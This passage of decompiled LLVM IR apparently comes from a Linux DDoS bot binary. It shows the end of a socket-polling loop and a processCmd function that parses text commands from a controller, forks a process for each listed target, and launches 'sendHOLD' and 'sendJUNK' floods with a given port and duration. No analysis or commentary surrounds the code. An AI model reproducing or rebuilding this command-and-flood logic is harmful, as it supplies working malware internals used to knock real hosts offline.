  %v1_804c8fb = load i32, i32* @esp, align 4
  %v2_804c8fb = add i32 %v1_804c8fb, 12
  %v3_804c8fb = inttoptr i32 %v2_804c8fb to i32*
  store i32 %v2_804c765, i32* %v3_804c8fb, align 4
  %v0_804c8ff = load i32, i32* @esp, align 4
  %v1_804c8ff = add i32 %v0_804c8ff, 8
  %v2_804c8ff = inttoptr i32 %v1_804c8ff to i32*
  store i32 0, i32* %v2_804c8ff, align 4
  %v0_804c907 = load i32, i32* @esp, align 4
  %v1_804c907 = add i32 %v0_804c907, 4
  %v2_804c907 = inttoptr i32 %v1_804c907 to i32*
  store i32 0, i32* %v2_804c907, align 4
  %v0_804c90f = load i32, i32* %edx.global-to-local, align 4
  %v1_804c90f = load i32, i32* @esp, align 4
  %v2_804c90f = inttoptr i32 %v1_804c90f to i32*
  store i32 %v0_804c90f, i32* %v2_804c90f, align 4
  %v0_804c912 = load i32, i32* %stack_var_-204, align 4
  %v2_804c912 = load i32, i32* %stack_var_-196, align 4
  %v5_804c912 = call i32 @__libc_select(i32 %v0_804c912, i32 10000, i32 %v2_804c912, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c912, i32* %eax.global-to-local, align 4
  %v4_804c91a = icmp eq i32 %v5_804c912, 0
  br i1 %v4_804c91a, label %dec_label_pc_804c93c, label %dec_label_pc_804c920

dec_label_pc_804c920:                             ; preds = %dec_label_pc_804c890
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c926 = load i32, i32* %v4_804c8af, align 8
  store i32 %v5_804c926, i32* %eax.global-to-local, align 4
  %v1_804c929 = load i32, i32* @esp, align 4
  %v2_804c929 = inttoptr i32 %v1_804c929 to i32*
  store i32 %v5_804c926, i32* %v2_804c929, align 4
  %v1_804c92c = call i32 @__libc_close(i32 %v5_804c912)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c661, align 4
  br label %dec_label_pc_804c93c

dec_label_pc_804c93c:                             ; preds = %dec_label_pc_804c689, %dec_label_pc_804c890, %dec_label_pc_804c865, %dec_label_pc_804c86f, %dec_label_pc_804c855, %dec_label_pc_804c834, %dec_label_pc_804c74b, %dec_label_pc_804c735, %dec_label_pc_804c920
  %v4_804c93c = add nuw nsw i32 %storemerge42, 1
  store i32 %v4_804c93c, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c93c, %v2_804c567
  br i1 %exitcond, label %dec_label_pc_804c94b, label %dec_label_pc_804c65b

dec_label_pc_804c94b:                             ; preds = %dec_label_pc_804c93f.preheader, %dec_label_pc_804c93c, %dec_label_pc_804c5a5
  %stack_var_-44.0 = phi i32 [ %tmp8, %dec_label_pc_804c5a5 ], [ 0, %dec_label_pc_804c93f.preheader ], [ %v2_804c567, %dec_label_pc_804c93c ]
  %v0_804c94b = load i32, i32* @esp, align 4
  %v1_804c94b = inttoptr i32 %v0_804c94b to i32*
  store i32 0, i32* %v1_804c94b, align 4
  %v1_804c952 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_804c952 = call i32 @__GI_time(i32* %v1_804c952)
  store i32 %v2_804c952, i32* %eax.global-to-local, align 4
  %v5_804c95a = icmp slt i32 %v2_804c952, %v5_804c644
  br i1 %v5_804c95a, label %dec_label_pc_804c93f.preheader, label %dec_label_pc_804c960

dec_label_pc_804c93f.preheader:                   ; preds = %dec_label_pc_804c94b
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_804c94240, label %dec_label_pc_804c65b, label %dec_label_pc_804c94b

dec_label_pc_804c960:                             ; preds = %dec_label_pc_804c94b, %entry
  %v0_804c96c = phi i32 [ %v3_804c597, %entry ], [ %v2_804c952, %dec_label_pc_804c94b ]
  %v2_804c969 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c969, i32* @ebx, align 4
  store i32 %v0_804c549, i32* @edi, align 4
  ret i32 %v0_804c96c

; uselistorder directives
  uselistorder i32 %v4_804c93c, { 1, 2, 0 }
  uselistorder i32 %v1_804c8c0, { 1, 0 }
  uselistorder i32 %v5_804c7dd, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c78b, { 1, 0 }
  uselistorder i32* %v4_804c77a, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_804c661, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i8* %v5_804c661, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge42, { 5, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 21, 20, 19, 18, 17, 16, 0, 1 }
  uselistorder i32 %v2_804c765, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_804c5fc, { 1, 0 }
  uselistorder i32 %v2_804c5df, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 4, 5 }
  uselistorder i32 %v1_804c575, { 1, 0 }
  uselistorder i32 %v2_804c567, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804c559, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 3, 1, 2, 0, 4 }
  uselistorder i32* %stack_var_-204, { 1, 3, 0, 2, 4, 5 }
  uselistorder i32* %stack_var_-208, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %eax.global-to-local, { 53, 1, 44, 0, 2, 3, 7, 4, 5, 6, 8, 9, 11, 10, 12, 13, 15, 16, 14, 17, 18, 22, 19, 20, 21, 23, 24, 26, 25, 29, 27, 28, 30, 31, 35, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 45, 47, 46, 48, 50, 49, 51, 52 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 6, 5, 4, 7, 3, 2, 1, 0 }
  uselistorder i32 10000, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 11, 12, 13, 9, 10 }
  uselistorder i32 (i32, i32*)* @getHost, { 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c93c, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp121 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804c970 = load i32, i32* @edi, align 4
  %v0_804c971 = load i32, i32* @esi, align 4
  %v0_804c972 = load i32, i32* @ebx, align 4
  store i32 %v0_804c972, i32* %stack_var_-16, align 4
  %v5_804c973 = icmp ult i32* %stack_var_-16, inttoptr (i32 284 to i32*)
  store i1 %v5_804c973, i1* %cf.global-to-local, align 1
  %v2_804c97c = load i32, i32* %arg2, align 4
  %v4_804c999 = inttoptr i32 %v2_804c97c to i8*
  store i32 %v2_804c97c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052e57.27 to i32), i32* @edi, align 4
  %v7_804c9ab = call i32 @_strncmp(i8* %v4_804c999, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052e57.27, i32 0, i32 0), i32 5)
  %v8_804c9ab = urem i32 %v7_804c9ab, 2
  %v9_804c9ab = icmp eq i32 %v8_804c9ab, 0
  %v0_804c9ad = load i1, i1* %cf.global-to-local, align 1
  %v2_804c9ad = or i1 %v0_804c9ad, %v9_804c9ab
  %v3_804c9ad = zext i1 %v2_804c9ad to i32
  %v4_804c9ad = load i32, i32* @edx, align 4
  %v5_804c9ad = and i32 %v4_804c9ad, -256
  %v6_804c9ad = or i32 %v3_804c9ad, %v5_804c9ad
  %v7_804c9ad = xor i32 %v6_804c9ad, 1
  store i32 %v7_804c9ad, i32* %edx.global-to-local, align 4
  %v1_804c9b5 = trunc i32 %v7_804c9ad to i8
  %v3_804c9b5 = zext i1 %v0_804c9ad to i8
  %v15_804c9b5 = icmp eq i8 %v1_804c9b5, %v3_804c9b5
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c9be = icmp eq i1 %v15_804c9b5, false
  br i1 %v1_804c9be, label %dec_label_pc_804c9da, label %dec_label_pc_804c9c0

dec_label_pc_804c9c0:                             ; preds = %entry
  %v0_804c9c0 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804c9c0 = ptrtoint i8* %v0_804c9c0 to i32
  %v3_804c9d0 = call i32 @sockprintf(i32 %v1_804c9c0, i32 ptrtoint ([6 x i8]* @global_var_8052edc.54 to i32))
  br label %dec_label_pc_804d3e4

dec_label_pc_804c9da:                             ; preds = %entry
  %v2_804c9dd = load i32, i32* %arg2, align 4
  %v4_804c9fa = inttoptr i32 %v2_804c9dd to i8*
  store i32 %v2_804c9dd, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8052ee2.55 to i32), i32* @edi, align 4
  %v7_804ca0c = call i32 @_strncmp(i8* %v4_804c9fa, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8052ee2.55, i32 0, i32 0), i32 11)
  %v8_804ca0c = urem i32 %v7_804ca0c, 2
  %v9_804ca0c = icmp eq i32 %v8_804ca0c, 0
  %v0_804ca0e = load i1, i1* %cf.global-to-local, align 1
  %v2_804ca0e = or i1 %v0_804ca0e, %v9_804ca0c
  %v3_804ca0e = zext i1 %v2_804ca0e to i32
  %v4_804ca0e = load i32, i32* %edx.global-to-local, align 4
  %v5_804ca0e = and i32 %v4_804ca0e, -256
  %v6_804ca0e = or i32 %v3_804ca0e, %v5_804ca0e
  %v7_804ca0e = xor i32 %v6_804ca0e, 1
  store i32 %v7_804ca0e, i32* %edx.global-to-local, align 4
  %v1_804ca16 = trunc i32 %v7_804ca0e to i8
  %v3_804ca16 = zext i1 %v0_804ca0e to i8
  %v15_804ca16 = icmp eq i8 %v1_804ca16, %v3_804ca16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca1f = icmp eq i1 %v15_804ca16, false
  br i1 %v1_804ca1f, label %dec_label_pc_804ca4d, label %dec_label_pc_804ca21

dec_label_pc_804ca21:                             ; preds = %dec_label_pc_804c9da
  %v0_804ca21 = load i32, i32* @global_var_805b980.33, align 128
  %v2_804ca29 = call i32 @__GI_inet_ntoa(i32 %v0_804ca21)
  %v0_804ca2e = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804ca2e = ptrtoint i8* %v0_804ca2e to i32
  store i32 %v1_804ca2e, i32* %edx.global-to-local, align 4
  %v3_804ca43 = call i32 @sockprintf(i32 %v1_804ca2e, i32 ptrtoint ([10 x i8]* @global_var_8052eed.56 to i32))
  br label %dec_label_pc_804d3e4

dec_label_pc_804ca4d:                             ; preds = %dec_label_pc_804c9da
  %v2_804ca50 = load i32, i32* %arg2, align 4
  %v4_804ca6d = inttoptr i32 %v2_804ca50 to i8*
  store i32 %v2_804ca50, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052ef7.57 to i32), i32* @edi, align 4
  %v7_804ca7f = call i32 @_strncmp(i8* %v4_804ca6d, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052ef7.57, i32 0, i32 0), i32 5)
  %v8_804ca7f = urem i32 %v7_804ca7f, 2
  %v9_804ca7f = icmp eq i32 %v8_804ca7f, 0
  %v0_804ca81 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ca81 = or i1 %v0_804ca81, %v9_804ca7f
  %v3_804ca81 = zext i1 %v2_804ca81 to i32
  %v4_804ca81 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ca81 = and i32 %v4_804ca81, -256
  %v6_804ca81 = or i32 %v3_804ca81, %v5_804ca81
  %v7_804ca81 = xor i32 %v6_804ca81, 1
  store i32 %v7_804ca81, i32* @edx, align 4
  %v1_804ca89 = trunc i32 %v7_804ca81 to i8
  %v3_804ca89 = zext i1 %v0_804ca81 to i8
  %v4_804ca89 = sub nsw i8 %v1_804ca89, %v3_804ca89
  %v15_804ca89 = icmp eq i8 %v4_804ca89, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca92 = icmp eq i1 %v15_804ca89, false
  br i1 %v1_804ca92, label %dec_label_pc_804cbcc, label %dec_label_pc_804ca98

dec_label_pc_804ca98:                             ; preds = %dec_label_pc_804ca4d
  %v2_804ca8d = sext i8 %v4_804ca89 to i32
  %v9_804ca98 = icmp ult i32 %arg1, 3
  store i1 %v9_804ca98, i1* %cf.global-to-local, align 1
  %v7_804ca9c = icmp sgt i32 %arg1, 3
  br i1 %v7_804ca9c, label %dec_label_pc_804caa2, label %dec_label_pc_804d3e4

dec_label_pc_804caa2:                             ; preds = %dec_label_pc_804ca98
  %v1_804caa5 = add i32 %tmp121, 8
  %v5_804caa5 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804caa5, i1* %cf.global-to-local, align 1
  %v1_804caa8 = inttoptr i32 %v1_804caa5 to i32*
  %v2_804caa8 = load i32, i32* %v1_804caa8, align 4
  %v2_804caad = call i32 @atol(i32 %v2_804caa8)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp128 = icmp slt i32 %v2_804caad, 1
  br i1 %tmp128, label %dec_label_pc_804d3e4, label %dec_label_pc_804caba

dec_label_pc_804caba:                             ; preds = %dec_label_pc_804caa2
  %v1_804cabd = add i32 %tmp121, 12
  %v5_804cabd = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804cabd, i1* %cf.global-to-local, align 1
  %v1_804cac0 = inttoptr i32 %v1_804cabd to i32*
  %v2_804cac0 = load i32, i32* %v1_804cac0, align 4
  %v2_804cac5 = call i32 @atol(i32 %v2_804cac0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v2_804cac5, 1
  %tmp130 = icmp eq i1 %tmp129, false
  br i1 %tmp130, label %dec_label_pc_804cad3, label %dec_label_pc_804d3e4

dec_label_pc_804cad3:                             ; preds = %dec_label_pc_804caba
  %v1_804cad6 = add i32 %tmp121, 4
  %v1_804cad9 = inttoptr i32 %v1_804cad6 to i32*
  %v2_804cad9 = load i32, i32* %v1_804cad9, align 4
  store i1 %v5_804caa5, i1* %cf.global-to-local, align 1
  %v2_804cae4 = load i32, i32* %v1_804caa8, align 4
  %v2_804cae9 = call i32 @atol(i32 %v2_804cae4)
  store i1 %v5_804cabd, i1* %cf.global-to-local, align 1
  %v2_804caf7 = load i32, i32* %v1_804cac0, align 4
  %v2_804cafc = call i32 @atol(i32 %v2_804caf7)
  %v4_804cb0f = inttoptr i32 %v2_804cad9 to i8*
  %v4_804cb12 = call i32 @__GI_strchr(i8* %v4_804cb0f, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb17 = icmp eq i32 %v4_804cb12, 0
  br i1 %v1_804cb17, label %dec_label_pc_804cb8d, label %dec_label_pc_804cb1b

dec_label_pc_804cb1b:                             ; preds = %dec_label_pc_804cad3
  store i32 %v2_804cad9, i32* @eax, align 4
  %v3_804cb29 = call i32 @__GI_strtok(i32 %v2_804cad9, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cb8543 = icmp eq i32 %v3_804cb29, 0
  %v1_804cb8950 = icmp eq i1 %v4_804cb8543, false
  br i1 %v1_804cb8950, label %dec_label_pc_804cb33, label %dec_label_pc_804cbcc

dec_label_pc_804cb33:                             ; preds = %dec_label_pc_804cb1b, %dec_label_pc_804cb6e
  %storemerge851 = phi i32 [ %v3_804cb7d, %dec_label_pc_804cb6e ], [ %v3_804cb29, %dec_label_pc_804cb1b ]
  %v0_804cb33 = call i32 @listFork()
  store i32 %v0_804cb33, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb38 = icmp eq i32 %v0_804cb33, 0
  %v1_804cb3a = icmp eq i1 %v1_804cb38, false
  br i1 %v1_804cb3a, label %dec_label_pc_804cb6e, label %dec_label_pc_804cb3c

dec_label_pc_804cb3c:                             ; preds = %dec_label_pc_804cb33
  %v4_804cb50 = call i32 @sendHOLD(i32 %storemerge851, i32 %v2_804cae9, i32 %v2_804cafc)
  %v0_804cb55 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804cb55 = ptrtoint i8* %v0_804cb55 to i32
  %v2_804cb5d = call i32 @__libc_close(i32 %v1_804cb55)
  %v2_804cb69 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cb6e:                             ; preds = %dec_label_pc_804cb33
  %v3_804cb7d = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cb85 = icmp eq i32 %v3_804cb7d, 0
  %v1_804cb89 = icmp eq i1 %v4_804cb85, false
  br i1 %v1_804cb89, label %dec_label_pc_804cb33, label %dec_label_pc_804cbcc

dec_label_pc_804cb8d:                             ; preds = %dec_label_pc_804cad3
  %v0_804cb8d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb92 = icmp eq i32 %v0_804cb8d, 0
  %v1_804cb94 = icmp eq i1 %v1_804cb92, false
  br i1 %v1_804cb94, label %dec_label_pc_804d3e4, label %dec_label_pc_804cb9a

dec_label_pc_804cb9a:                             ; preds = %dec_label_pc_804cb8d
  %v4_804cbae = call i32 @sendHOLD(i32 %v2_804cad9, i32 %v2_804cae9, i32 %v2_804cafc)
  %v0_804cbb3 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804cbb3 = ptrtoint i8* %v0_804cbb3 to i32
  %v2_804cbbb = call i32 @__libc_close(i32 %v1_804cbb3)
  %v2_804cbc7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cbcc:                             ; preds = %dec_label_pc_804cb6e, %dec_label_pc_804cb1b, %dec_label_pc_804ca4d
  %v2_804cbcf = load i32, i32* %arg2, align 4
  %v4_804cbec = inttoptr i32 %v2_804cbcf to i8*
  store i32 %v2_804cbcf, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052efc.58 to i32), i32* @edi, align 4
  %v7_804cbfe = call i32 @_strncmp(i8* %v4_804cbec, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052efc.58, i32 0, i32 0), i32 5)
  %v8_804cbfe = urem i32 %v7_804cbfe, 2
  %v9_804cbfe = icmp eq i32 %v8_804cbfe, 0
  %v0_804cc00 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cc00 = or i1 %v0_804cc00, %v9_804cbfe
  %v3_804cc00 = zext i1 %v2_804cc00 to i32
  %v4_804cc00 = load i32, i32* @edx, align 4
  %v5_804cc00 = and i32 %v4_804cc00, -256
  %v6_804cc00 = or i32 %v3_804cc00, %v5_804cc00
  %v7_804cc00 = xor i32 %v6_804cc00, 1
  store i32 %v7_804cc00, i32* @edx, align 4
  %v1_804cc08 = trunc i32 %v7_804cc00 to i8
  %v3_804cc08 = zext i1 %v0_804cc00 to i8
  %v4_804cc08 = sub nsw i8 %v1_804cc08, %v3_804cc08
  %v15_804cc08 = icmp eq i8 %v4_804cc08, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc11 = icmp eq i1 %v15_804cc08, false
  br i1 %v1_804cc11, label %dec_label_pc_804cd4b, label %dec_label_pc_804cc17

dec_label_pc_804cc17:                             ; preds = %dec_label_pc_804cbcc
  %v2_804cc0c = sext i8 %v4_804cc08 to i32
  %v9_804cc17 = icmp ult i32 %arg1, 3
  store i1 %v9_804cc17, i1* %cf.global-to-local, align 1
  %v7_804cc1b = icmp sgt i32 %arg1, 3
  br i1 %v7_804cc1b, label %dec_label_pc_804cc21, label %dec_label_pc_804d3e4

dec_label_pc_804cc21:                             ; preds = %dec_label_pc_804cc17
  %v1_804cc24 = add i32 %tmp121, 8
  %v5_804cc24 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804cc24, i1* %cf.global-to-local, align 1
  %v1_804cc27 = inttoptr i32 %v1_804cc24 to i32*
  %v2_804cc27 = load i32, i32* %v1_804cc27, align 4
  %v2_804cc2c = call i32 @atol(i32 %v2_804cc27)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp131 = icmp slt i32 %v2_804cc2c, 1
  br i1 %tmp131, label %dec_label_pc_804d3e4, label %dec_label_pc_804cc39

dec_label_pc_804cc39:                             ; preds = %dec_label_pc_804cc21
  %v1_804cc3c = add i32 %tmp121, 12
  %v5_804cc3c = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804cc3c, i1* %cf.global-to-local, align 1
  %v1_804cc3f = inttoptr i32 %v1_804cc3c to i32*
  %v2_804cc3f = load i32, i32* %v1_804cc3f, align 4
  %v2_804cc44 = call i32 @atol(i32 %v2_804cc3f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp132 = icmp slt i32 %v2_804cc44, 1
  %tmp133 = icmp eq i1 %tmp132, false
  br i1 %tmp133, label %dec_label_pc_804cc52, label %dec_label_pc_804d3e4

dec_label_pc_804cc52:                             ; preds = %dec_label_pc_804cc39
  %v1_804cc55 = add i32 %tmp121, 4
  %v1_804cc58 = inttoptr i32 %v1_804cc55 to i32*
  %v2_804cc58 = load i32, i32* %v1_804cc58, align 4
  store i1 %v5_804cc24, i1* %cf.global-to-local, align 1
  %v2_804cc63 = load i32, i32* %v1_804cc27, align 4
  %v2_804cc68 = call i32 @atol(i32 %v2_804cc63)
  store i1 %v5_804cc3c, i1* %cf.global-to-local, align 1
  %v2_804cc76 = load i32, i32* %v1_804cc3f, align 4
  %v2_804cc7b = call i32 @atol(i32 %v2_804cc76)
  %v4_804cc8e = inttoptr i32 %v2_804cc58 to i8*
  %v4_804cc91 = call i32 @__GI_strchr(i8* %v4_804cc8e, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc96 = icmp eq i32 %v4_804cc91, 0
  br i1 %v1_804cc96, label %dec_label_pc_804cd0c, label %dec_label_pc_804cc9a

dec_label_pc_804cc9a:                             ; preds = %dec_label_pc_804cc52
  store i32 %v2_804cc58, i32* @eax, align 4
  %v3_804cca8 = call i32 @__GI_strtok(i32 %v2_804cc58, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cd0434 = icmp eq i32 %v3_804cca8, 0
  %v1_804cd0841 = icmp eq i1 %v4_804cd0434, false
  br i1 %v1_804cd0841, label %dec_label_pc_804ccb2, label %dec_label_pc_804cd4b

dec_label_pc_804ccb2:                             ; preds = %dec_label_pc_804cc9a, %dec_label_pc_804cced
  %storemerge942 = phi i32 [ %v3_804ccfc, %dec_label_pc_804cced ], [ %v3_804cca8, %dec_label_pc_804cc9a ]
  %v0_804ccb2 = call i32 @listFork()
  store i32 %v0_804ccb2, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ccb7 = icmp eq i32 %v0_804ccb2, 0
  %v1_804ccb9 = icmp eq i1 %v1_804ccb7, false
  br i1 %v1_804ccb9, label %dec_label_pc_804cced, label %dec_label_pc_804ccbb

dec_label_pc_804ccbb:                             ; preds = %dec_label_pc_804ccb2
  %v4_804cccf = call i32 @sendJUNK(i32 %storemerge942, i32 %v2_804cc68, i32 %v2_804cc7b)
  %v0_804ccd4 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804ccd4 = ptrtoint i8* %v0_804ccd4 to i32
  %v2_804ccdc = call i32 @__libc_close(i32 %v1_804ccd4)
  %v2_804cce8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cced:                             ; preds = %dec_label_pc_804ccb2
  %v3_804ccfc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cd04 = icmp eq i32 %v3_804ccfc, 0
  %v1_804cd08 = icmp eq i1 %v4_804cd04, false
  br i1 %v1_804cd08, label %dec_label_pc_804ccb2, label %dec_label_pc_804cd4b

dec_label_pc_804cd0c:                             ; preds = %dec_label_pc_804cc52
  %v0_804cd0c = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cd11 = icmp eq i32 %v0_804cd0c, 0
  %v1_804cd13 = icmp eq i1 %v1_804cd11, false
  br i1 %v1_804cd13, label %dec_label_pc_804d3e4, label %dec_label_pc_804cd19

dec_label_pc_804cd19:                             ; preds = %dec_label_pc_804cd0c
  %v4_804cd2d = call i32 @sendJUNK(i32 %v2_804cc58, i32 %v2_804cc68, i32 %v2_804cc7b)
  %v0_804cd32 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804cd32 = ptrtoint i8* %v0_804cd32 to i32
  %v2_804cd3a = call i32 @__libc_close(i32 %v1_804cd32)
  %v2_804cd46 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cd4b:                             ; preds = %dec_label_pc_804cced, %dec_label_pc_804cc9a, %dec_label_pc_804cbcc
  %v2_804cd4e = load i32, i32* %arg2, align 4
  %v4_804cd6b = inttoptr i32 %v2_804cd4e to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_8052f01.59 to i32), i32* @edi, align 4
  %v7_804cd7d = call i32 @_strncmp(i8* %v4_804cd6b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052f01.59, i32 0, i32 0), i32 4)
  %v8_804cd7d = urem i32 %v7_804cd7d, 2
  %v9_804cd7d = icmp eq i32 %v8_804cd7d, 0
  %v0_804cd7f = load i1, i1* %cf.global-to-local, align 1
  %v2_804cd7f = or i1 %v0_804cd7f, %v9_804cd7d
  %v3_804cd7f = zext i1 %v2_804cd7f to i32
  %v4_804cd7f = load i32, i32* @edx, align 4
  %v5_804cd7f = and i32 %v4_804cd7f, -256
  %v6_804cd7f = or i32 %v3_804cd7f, %v5_804cd7f
  %v7_804cd7f = xor i32 %v6_804cd7f, 1
  store i32 %v7_804cd7f, i32* @edx, align 4
  %v1_804cd87 = trunc i32 %v7_804cd7f to i8
  %v3_804cd87 = zext i1 %v0_804cd7f to i8
  %v4_804cd87 = sub nsw i8 %v1_804cd87, %v3_804cd87
  %v15_804cd87 = icmp eq i8 %v4_804cd87, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cd90 = icmp eq i1 %v15_804cd87, false
  br i1 %v1_804cd90, label %dec_label_pc_804cfd5, label %dec_label_pc_804cd96

dec_label_pc_804cd96:                             ; preds = %dec_label_pc_804cd4b
  %v2_804cd8b = sext i8 %v4_804cd87 to i32
  %v9_804cd96 = icmp ult i32 %arg1, 5
  store i1 %v9_804cd96, i1* %cf.global-to-local, align 1
  %v7_804cd9a = icmp sgt i32 %arg1, 5
  br i1 %v7_804cd9a, label %dec_label_pc_804cda0, label %dec_label_pc_804d3e4

dec_label_pc_804cda0:                             ; preds = %dec_label_pc_804cd96
  %v1_804cda3 = add i32 %tmp121, 12
  %v5_804cda3 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804cda3, i1* %cf.global-to-local, align 1
  %v1_804cda6 = inttoptr i32 %v1_804cda3 to i32*
  %v2_804cda6 = load i32, i32* %v1_804cda6, align 4
  %v2_804cdab = call i32 @atol(i32 %v2_804cda6)
  %v5_804cdb0 = icmp ne i32 %v2_804cdab, -1
  store i1 %v5_804cdb0, i1* %cf.global-to-local, align 1
  %v10_804cdb0 = icmp eq i32 %v2_804cdab, -1
  br i1 %v10_804cdb0, label %dec_label_pc_804d3e4, label %dec_label_pc_804cdb9

dec_label_pc_804cdb9:                             ; preds = %dec_label_pc_804cda0
  %v1_804cdbc = add i32 %tmp121, 8
  %v5_804cdbc = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804cdbc, i1* %cf.global-to-local, align 1
  %v1_804cdbf = inttoptr i32 %v1_804cdbc to i32*
  %v2_804cdbf = load i32, i32* %v1_804cdbf, align 4
  %v2_804cdc4 = call i32 @atol(i32 %v2_804cdbf)
  %v5_804cdc9 = icmp ne i32 %v2_804cdc4, -1
  store i1 %v5_804cdc9, i1* %cf.global-to-local, align 1
  %v10_804cdc9 = icmp eq i32 %v2_804cdc4, -1
  br i1 %v10_804cdc9, label %dec_label_pc_804d3e4, label %dec_label_pc_804cdd2

dec_label_pc_804cdd2:                             ; preds = %dec_label_pc_804cdb9
  %v1_804cdd5 = add i32 %tmp121, 16
  %v2_804cdd5 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804cdd5, i1* %cf.global-to-local, align 1
  %v1_804cdd8 = inttoptr i32 %v1_804cdd5 to i32*
  %v2_804cdd8 = load i32, i32* %v1_804cdd8, align 4
  %v2_804cddd = call i32 @atol(i32 %v2_804cdd8)
  %v5_804cde2 = icmp ne i32 %v2_804cddd, -1
  store i1 %v5_804cde2, i1* %cf.global-to-local, align 1
  %v10_804cde2 = icmp eq i32 %v2_804cddd, -1
  br i1 %v10_804cde2, label %dec_label_pc_804d3e4, label %dec_label_pc_804cdeb

dec_label_pc_804cdeb:                             ; preds = %dec_label_pc_804cdd2
  %v1_804cdee = add i32 %tmp121, 20
